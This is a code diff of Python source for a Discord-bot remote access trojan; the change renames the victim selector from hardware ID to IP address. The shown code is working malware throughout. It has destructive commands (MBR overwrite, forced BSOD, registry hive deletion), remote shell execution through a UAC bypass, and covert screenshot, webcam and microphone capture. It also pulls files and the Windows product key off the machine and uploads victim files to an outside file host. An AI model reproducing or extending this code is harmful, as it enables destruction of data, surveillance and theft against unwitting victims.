@@ -23,8 +23,8 @@ devmode = True
 config = LoadsConfig()
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
 
-def CheckHWID(HWID):
-	if HWID == pc.HWID():
+def CheckIP(IP):
+	if IP == pc.IP():
 		return True
 	else:
 		return False
@@ -40,22 +40,22 @@ async def safe(ctx):
 
 class Destroy(commands.Cog, description='Destory PC Victim'):
 	@commands.command(aliases=["mbr"], brief='MBR Overwrite', description='MBR Overwrite')
-	async def MBROverwrite(self, ctx, HWID: str, ):
-		if not CheckHWID(HWID):
+	async def MBROverwrite(self, ctx, IP: str, ):
+		if not CheckIP(IP):
 			return
 		await SendOutput(ctx, 'Starting MBR Overwrite')
 		DestroyWindow.MBROverwrite()
 
 	@commands.command(aliases=["bsod"], brief='Blue Screen Of Death', description='Blue Screen Of Death')
-	async def BSOD(self, ctx, HWID: str):
-		if not CheckHWID(HWID):
+	async def BSOD(self, ctx, IP: str):
+		if not CheckIP(IP):
 			return
 		await SendOutput(ctx, 'Starting BSOD')
 		DestroyWindow.BSOD()
 
 	@commands.command(aliases=["regdelete"], brief='Delete HKCU and HKLM/System', description='Delete HKCU and HKLM/System')
-	async def RegistryDelete(self, ctx, HWID: str, ):
-		if not CheckHWID(HWID):
+	async def RegistryDelete(self, ctx, IP: str, ):
+		if not CheckIP(IP):
 			return
 		await SendOutput(ctx, 'Starting Delete Registry')
 		DestroyWindow.RegistryDelete()
@@ -73,9 +73,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		pass
 
 	@commands.command(aliases=['reg'], brief='Control Registry', description='Control Registry')
-	async def Registry(self, ctx, HWID: str, method: str, path: str, ):
+	async def Registry(self, ctx, IP: str, method: str, path: str, ):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		command = f"reg {method} {path} /f"
 		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
@@ -83,9 +83,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tkill', 'tk'], brief='End Processes by Process Name', description='End Processes by Process Name')
-	async def Taskkill(self, ctx, HWID: str, Name: str, ):
+	async def Taskkill(self, ctx, IP: str, Name: str, ):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		command = f'taskkill /f /im {Name}'
 		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
@@ -93,9 +93,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tlist', 'tl'], brief='List All Processes Running on PC Victim', description='List All Processes Running on PC Victim')
-	async def Tasklist(self, ctx, HWID: str, ):
+	async def Tasklist(self, ctx, IP: str, ):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		processes = ''
 		for proc in psutil.process_iter():
@@ -111,8 +111,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, processes)
 
 	@commands.command(aliases=['sc', 's'], brief='Screenshot PC Victim', description='Screenshot PC Victim')
-	async def Screenshot(self, ctx, HWID: str, ) -> None:
-		if not CheckHWID(HWID):
+	async def Screenshot(self, ctx, IP: str, ) -> None:
+		if not CheckIP(IP):
 			return
 		snapshot = ImageGrab.grab()
 		image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
@@ -121,8 +121,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await ctx.send(content = '', file=file)
 
 	@commands.command(aliases=["up", "u"], brief='Upload File to PC Victim', description='Upload File to PC Victim')
-	async def Upload(self, ctx, HWID: str, url: str, path_file: str = '.',):
-		if not CheckHWID(HWID):
+	async def Upload(self, ctx, IP: str, url: str, path_file: str = '.',):
+		if not CheckIP(IP):
 			return
 		response = requests.get(url)
 		parse = urlparse(url)
@@ -131,8 +131,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, f"Uploaded File {path_file}/{filename}")
 
 	@commands.command(aliases=["down", "d"], brief='Download File From PC Victim', description='Download File From PC Victim')
-	async def Download(self, ctx, HWID: str, path_file: str = '.',):
-		if not CheckHWID(HWID):
+	async def Download(self, ctx, IP: str, path_file: str = '.',):
+		if not CheckIP(IP):
 			return
 		if not os.path.exists(path_file):
 			await SendOutput(ctx, f"Not Found File {path_file}")
@@ -154,9 +154,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 			await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")
 
 	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
-	async def Run(self, ctx, HWID: str,  method = 'cmd', path_file: str = '.'):
+	async def Run(self, ctx, IP: str,  method = 'cmd', path_file: str = '.'):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 
 		def subp(method):
@@ -172,8 +172,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, 'Run Done!\n')
 
 	@commands.command(aliases=["msgbox", "mbox"], brief='Message Box To PC Victim', description='Message Box To PC Victim')
-	async def MessageBox(self, ctx, HWID: str, amount: int = 1, caption: str = 'Lol', *, message):
-		if not CheckHWID(HWID):
+	async def MessageBox(self, ctx, IP: str, amount: int = 1, caption: str = 'Lol', *, message):
+		if not CheckIP(IP):
 			return
 		def msg(amount, method, message):
 			for i in range(amount):
@@ -184,33 +184,33 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, "Done!")
 
 	@commands.command(aliases=["shutdown", "sd"], brief='Shutdown PC Victim', description='Shutdown PC Victim')
-	async def Shutdown(self, ctx, HWID: str):
-		if not CheckHWID(HWID):
+	async def Shutdown(self, ctx, IP: str):
+		if not CheckIP(IP):
 			return
 		command = 'shutdown /f /t 0'
 		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
-	async def Restart(self, ctx, HWID: str):
-		if not CheckHWID(HWID):
+	async def Restart(self, ctx, IP: str):
+		if not CheckIP(IP):
 			return
 		command = 'shutdown /f /r /t 0'
 		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
-	async def SignOut(self, ctx, HWID: str):
-		if not CheckHWID(HWID):
+	async def SignOut(self, ctx, IP: str):
+		if not CheckIP(IP):
 			return
 		command = 'shutdown /l'
 		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
-	async def BlockInput(self, ctx, HWID: str):
+	async def BlockInput(self, ctx, IP: str):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		kb_th = threading.Thread(target = self.keyboard_listener.start)
 		ms_th = threading.Thread(target = self.mouse_listener.start)
@@ -221,9 +221,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, 'Input has been blocked!')
 
 	@commands.command(aliases=["unblockinput", "ubinput"], brief='Unblock Keyboard and Mouse', description='Unblock Keyboard and Mouse')
-	async def UnblockInput(self, ctx, HWID: str):
+	async def UnblockInput(self, ctx, IP: str):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		self.keyboard_listener.stop()
 		self.mouse_listener.stop()
@@ -231,8 +231,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, 'Input has been unblocked!')
 
 	@commands.command(aliases=["kbtyping", "kbtping"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
-	async def KeyboardTyping(self, ctx, HWID: str, delay: int = 0.1, *, text = ''):
-		if not CheckHWID(HWID):
+	async def KeyboardTyping(self, ctx, IP: str, delay: int = 0.1, *, text = ''):
+		if not CheckIP(IP):
 			return
 		keyboard_ = keyboard.Controller()
 		async def typing():
@@ -251,8 +251,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		threading.Thread(target = between_typing).start()
 
 	@commands.command(aliases=["mouse", "mse"], brief='Control Mouse PC Victim', description='Control Mouse PC Victim')
-	async def Mouse(self, ctx, HWID: str, mode: str = 'set_postion',  x = 0, y = 0):
-		if not CheckHWID(HWID):
+	async def Mouse(self, ctx, IP: str, mode: str = 'set_postion',  x = 0, y = 0):
+		if not CheckIP(IP):
 			return
 		mous = mouse.Controller()
 		Button = mouse.Button()
@@ -271,9 +271,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, 'Done!')
 
 	@commands.command(aliases=["sprocess", "sp"], brief='Start Process in PC Victim', description='Start Process in PC Victim')
-	async def StartProcess(self, ctx, HWID: str, process = None, *, agruments):
+	async def StartProcess(self, ctx, IP: str, process = None, *, agruments):
 		await safe(ctx)
-		if not CheckHWID(HWID):
+		if not CheckIP(IP):
 			return
 		if process == None:
 			return
@@ -283,8 +283,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=["recordaudio", "raudio"], brief='Record Audio in PC Victim', description='Record Audio in PC Victim')
-	async def RecordAudio(self, ctx, HWID: str, duration: int = 5):
-		if not CheckHWID(HWID):
+	async def RecordAudio(self, ctx, IP: str, duration: int = 5):
+		if not CheckIP(IP):
 			return
 		path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
 		freq = 44100
@@ -311,8 +311,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 			await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
 
 	@commands.command(aliases=["webcamcapture", "wcap"], brief='Capture Webcam PC Victim', description='Capture Webcam PC Victim')
-	async def WebcamCapture(self, ctx, HWID: str):
-		if not CheckHWID(HWID):
+	async def WebcamCapture(self, ctx, IP: str):
+		if not CheckIP(IP):
 			return
 		pygame.camera.init()
 		cameras = pygame.camera.list_cameras()
@@ -336,8 +336,8 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await ctx.send(file=file)
 
 	@commands.command(aliases=["openurl"], brief='Open Url', description='Open Url')
-	async def OpenUrl(self, ctx, HWID: str, url: str):
-		if not CheckHWID(HWID):
+	async def OpenUrl(self, ctx, IP: str, url: str):
+		if not CheckIP(IP):
 			return
 		base = """
 [{000214A0-0000-0000-C000-000000000046}]
@@ -353,8 +353,8 @@ URL="""+ url +"""
 		await SendOutput(ctx, 'Done!')
 
 	@commands.command(aliases=["playaudio", "paudio"], brief='Play Audio', description='Play Audio')
-	async def PlayAudio(self, ctx, HWID: str, url: str):
-		if not CheckHWID(HWID):
+	async def PlayAudio(self, ctx, IP: str, url: str):
+		if not CheckIP(IP):
 			return
 
 		response = requests.get(url)
@@ -382,15 +382,15 @@ URL="""+ url +"""
 		threading.Thread(target = handle).start()
 
 	@commands.command(aliases=["speech"], brief='Text To Speech', description='Text To Speech')
-	async def Speech(self, ctx, HWID: str, *, text: str):
-		if not CheckHWID(HWID):
+	async def Speech(self, ctx, IP: str, *, text: str):
+		if not CheckIP(IP):
 			return
 		os.system(f'mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""{text}"")(window.close)")')
 		await SendOutput(ctx, 'Done!')
 
 	@commands.command(aliases=["shell"], brief='The Shell (cmd, pwsh)', description='The Shell (cmd, pwsh)')
-	async def Shell(self, ctx, HWID: str, shell_type: str = 'cmd', *, command: str):
-		if not CheckHWID(HWID):
+	async def Shell(self, ctx, IP: str, shell_type: str = 'cmd', *, command: str):
+		if not CheckIP(IP):
 			return
 
 		if shell_type == 'cmd':
@@ -400,8 +400,8 @@ URL="""+ url +"""
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=["cd"], brief='Change Directory', description='Change Directory')
-	async def Cd(self, ctx, HWID: str, *, path: str):
-		if not CheckHWID(HWID):
+	async def Cd(self, ctx, IP: str, *, path: str):
+		if not CheckIP(IP):
 			return
 		if not os.path.exists(path):
 			await SendOutput(ctx, 'Path Not Found!')
@@ -410,8 +410,8 @@ URL="""+ url +"""
 		await SendOutput(ctx, f"Changed Directory to {os.getcwd()}")
 
 	@commands.command(aliases=["dir", 'ls'], brief='List Item in Directory', description='List Item in Directory')
-	async def ListItemDirectory(self, ctx, HWID: str, *, path: str = '.'):
-		if not CheckHWID(HWID):
+	async def ListItemDirectory(self, ctx, IP: str, *, path: str = '.'):
+		if not CheckIP(IP):
 			return
 
 		output = str(subprocess.check_output(f'dir {path}', shell=True), 'utf-8')
@@ -424,10 +424,10 @@ class OtherCommands(commands.Cog, description='Other Commands'):
 		await ctx.send(embed = vic)
 
 	@commands.command(aliases=["getinfo"], brief='Get Information of PC Victim', description='Get Information of PC Victim')
-	async def GetInformation(self, ctx, HWID: str, ):
-		if not CheckHWID(HWID):
+	async def GetInformation(self, ctx, IP: str, ):
+		if not CheckIP(IP):
 			return
-		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nHWID: {pc.HWID()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
+		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nIP: {pc.IP()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
 		await ctx.send(embed = information_embed)
 
 @client.event
